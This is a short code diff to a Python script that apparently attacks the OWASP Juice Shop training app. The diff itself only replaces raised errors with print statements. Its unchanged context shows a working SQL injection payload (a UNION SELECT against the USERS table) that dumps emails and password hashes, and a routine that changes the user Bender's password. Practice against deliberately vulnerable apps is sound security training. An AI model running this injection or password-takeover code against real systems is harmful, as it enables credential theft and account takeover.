@@ -14,7 +14,7 @@ def get_users(server, session):
     """
     users = session.get('{}/rest/user/authentication-details/'.format(server))
     if not users.ok:
-        raise RuntimeError('Error retrieving user info. Request status: {}'.format(users.status_code))
+        print('Error retrieving user info. Request status: {}'.format(users.status_code))
     return users.json().get('data')
 
 
@@ -29,7 +29,7 @@ def get_users_with_sql_injection(server):
     injection = "test%27))%20UNION%20SELECT%20id,email,password,NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20USERS--"
     users = session.get('{}/rest/products/search?q={}'.format(server, injection))
     if not users.ok:
-        raise RuntimeError('Error with SQLi attempt.')
+        print('Error with SQLi attempt.')
     print('Found email and password hashes with SQLi, printing...')
     for user in users.json().get('data'):
         print('Email: {}, Password hash: {}'.format(user.get('name'), user.get('description')))
@@ -47,7 +47,7 @@ def change_bender_password(server):
     print('Changing Bender\'s password...', end=''),
     update = session.get(changeurl)
     if not update.ok:
-        raise RuntimeError('Error updating Bender\'s password.')
+        print('Error updating Bender\'s password.')
     print('Success.')
 
 
